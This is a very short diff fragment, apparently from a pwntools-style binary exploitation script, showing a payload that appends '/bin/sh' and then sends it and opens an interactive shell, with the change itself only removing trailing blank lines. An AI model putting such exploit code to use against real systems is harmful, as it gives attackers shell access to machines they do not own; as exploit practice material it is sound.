@@ -70,6 +70,3 @@ pay += b"/bin/sh\x00"
 p.send(pay)
 
 p.interactive()
-
-
-
